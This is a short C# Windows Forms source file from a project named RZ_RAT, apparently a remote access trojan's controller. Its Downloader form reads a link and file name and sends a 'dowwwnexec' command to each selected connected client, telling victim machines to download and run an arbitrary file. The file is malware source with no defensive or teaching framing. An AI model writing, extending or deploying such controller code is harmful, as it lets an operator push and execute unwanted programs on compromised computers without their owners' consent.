using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace RZ_RAT
{
    public partial class Downloader : Form
    {
        string FileName = null;
        string link = null;
        public Downloader()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            FileName = txtFileName.Text;
            link = txtLink.Text;
            ListView.SelectedListViewItemCollection breakfast = Form1.ServerObject.Context.listView1.SelectedItems;
            foreach (ListViewItem item in breakfast)
            {
                int index_ = (int)item.Tag;
                Form1.ServerObject.ClientsObjs[index_].addCommand("dowwwnexec", link, FileName);            }
        }
    }
}
